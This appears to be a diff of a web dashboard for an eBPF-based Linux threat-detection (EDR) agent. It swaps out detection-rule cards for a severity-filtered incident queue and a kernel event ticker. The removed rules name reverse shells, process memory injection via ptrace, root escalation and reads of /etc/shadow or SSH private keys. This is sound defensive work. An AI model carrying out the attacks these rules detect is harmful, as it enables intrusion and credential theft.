-              <span class="text-[11px] font-mono font-bold text-rose-400">RULE-EDR-001</span>
-              <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20">CRITICAL</span>
-            </div>
-            <h4 class="font-semibold text-sm text-white">Reverse Shell Execution</h4>
-            <p class="text-xs text-slate-400 mt-1">Detects interactive shell executions with socket redirection or scripting one-liners.</p>
-          </div>
-          <div class="mt-4 pt-3 border-t border-cyber-border text-xs flex items-center justify-between text-slate-400 font-mono">
-            <span>T1059.004</span>
-            <span class="text-purple-400">Execution</span>
-          </div>
-        </div>
+      <!-- Severity Filter Buttons -->
+      <div class="px-3 py-2 bg-tactical-900 border-b border-tactical-border flex items-center space-x-1.5 text-[10px] font-mono shrink-0">
+        <button onclick="filterQueue('ALL')" class="triage-filter-btn px-2 py-1 rounded bg-tactical-750 text-white font-bold">ALL</button>
+        <button onclick="filterQueue('CRITICAL')" class="triage-filter-btn px-2 py-1 rounded bg-tactical-850 text-tactical-muted hover:text-white">CRITICAL</button>
+        <button onclick="filterQueue('HIGH')" class="triage-filter-btn px-2 py-1 rounded bg-tactical-850 text-tactical-muted hover:text-white">HIGH</button>
+      </div>
 
-        <!-- Rule 2 -->
-        <div class="p-4 rounded-xl bg-cyber-850 border border-cyber-border flex flex-col justify-between">
-          <div>
-            <div class="flex items-center justify-between mb-1.5">
-              <span class="text-[11px] font-mono font-bold text-rose-400">RULE-EDR-002</span>
-              <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20">CRITICAL</span>
-            </div>
-            <h4 class="font-semibold text-sm text-white">Process Memory Injection</h4>
-            <p class="text-xs text-slate-400 mt-1">Detects unauthorized PTRACE_ATTACH and PTRACE_POKETEXT calls modifying process memory.</p>
-          </div>
-          <div class="mt-4 pt-3 border-t border-cyber-border text-xs flex items-center justify-between text-slate-400 font-mono">
-            <span>T1055.008</span>
-            <span class="text-purple-400">Defense Evasion</span>
-          </div>
-        </div>
-
-        <!-- Rule 3 -->
-        <div class="p-4 rounded-xl bg-cyber-850 border border-cyber-border flex flex-col justify-between">
-          <div>
-            <div class="flex items-center justify-between mb-1.5">
-              <span class="text-[11px] font-mono font-bold text-amber-400">RULE-EDR-003</span>
-              <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-500/10 text-amber-400 border border-amber-500/20">HIGH</span>
-            </div>
-            <h4 class="font-semibold text-sm text-white">Root Privilege Escalation</h4>
-            <p class="text-xs text-slate-400 mt-1">Detects UID transition to 0 (root) from non-init parent processes.</p>
-          </div>
-          <div class="mt-4 pt-3 border-t border-cyber-border text-xs flex items-center justify-between text-slate-400 font-mono">
-            <span>T1068</span>
-            <span class="text-purple-400">Priv Escalation</span>
-          </div>
-        </div>
-
-        <!-- Rule 4 -->
-        <div class="p-4 rounded-xl bg-cyber-850 border border-cyber-border flex flex-col justify-between">
-          <div>
-            <div class="flex items-center justify-between mb-1.5">
-              <span class="text-[11px] font-mono font-bold text-amber-400">RULE-EDR-004</span>
-              <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-500/10 text-amber-400 border border-amber-500/20">HIGH</span>
-            </div>
-            <h4 class="font-semibold text-sm text-white">Sensitive Credential Access</h4>
-            <p class="text-xs text-slate-400 mt-1">Detects unauthorized reads/writes to /etc/shadow or ~/.ssh private keys.</p>
-          </div>
-          <div class="mt-4 pt-3 border-t border-cyber-border text-xs flex items-center justify-between text-slate-400 font-mono">
-            <span>T1003.008</span>
-            <span class="text-purple-400">Credential Access</span>
-          </div>
+      <!-- Incident Queue Feed -->
+      <div id="incident-feed" class="flex-1 p-3 space-y-3 overflow-y-auto">
+        <!-- Empty placeholder -->
+        <div id="triage-empty" class="h-full flex flex-col items-center justify-center text-center p-6 text-tactical-muted space-y-2">
+          <i data-lucide="shield" class="w-8 h-8 text-tactical-border"></i>
+          <p class="text-xs font-display tracking-wider text-slate-400 uppercase">Perimeter Secure</p>
+          <p class="text-[11px] font-mono text-tactical-muted max-w-xs">Kernel probes listening on syscall tracepoints. No active compromises detected.</p>
         </div>
       </div>
+
     </section>
 
-  </main>
+  </div>
 
   <!-- ===================================================================== -->
-  <!-- Footer -->
+  <!-- Bottom Ticker / Kernel Event Stream Marquee -->
   <!-- ===================================================================== -->
-  <footer class="border-t border-cyber-border bg-cyber-900 py-6 text-xs text-slate-400">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4">
-      <div class="flex items-center space-x-2">
-        <span class="font-semibold text-slate-200">eBPF-Powered Linux Runtime Threat Detection & EDR Agent</span>
-        <span>•</span>
-        <span>MIT License</span>
-      </div>
-      <div class="flex items-center space-x-4">
-        <a href="https://attack.mitre.org" target="_blank" rel="noopener" class="hover:text-cyan-400 transition-colors">MITRE ATT&CK Matrix</a>
-        <a href="https://ebpf.io" target="_blank" rel="noopener" class="hover:text-cyan-400 transition-colors">eBPF.io</a>
-        <a href="https://github.com/ravishkarathnayaka/eBPF-Powered-Linux-Runtime-Threat-Detection-EDR-Agent" target="_blank" rel="noopener" class="hover:text-cyan-400 transition-colors">Source Code</a>
-      </div>
+  <footer class="h-8 bg-tactical-900 border-t border-tactical-border px-3 flex items-center justify-between text-[11px] font-mono text-tactical-muted shrink-0 select-none">
+    <div class="flex items-center space-x-2">
+      <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
+      <span class="text-slate-400 uppercase font-bold">TRACEPOINT LOG:</span>
+      <span id="bottom-ticker" class="text-tactical-amber truncate">Awaiting system call invocation...</span>
+    </div>
+    <div class="flex items-center space-x-3 hidden sm:flex">
+      <span>PERCPU_HEAP: OK</span>
+      <span>&bull;</span>
+      <span>RING_POLLED: 100 Hz</span>
     </div>
   </footer>
 
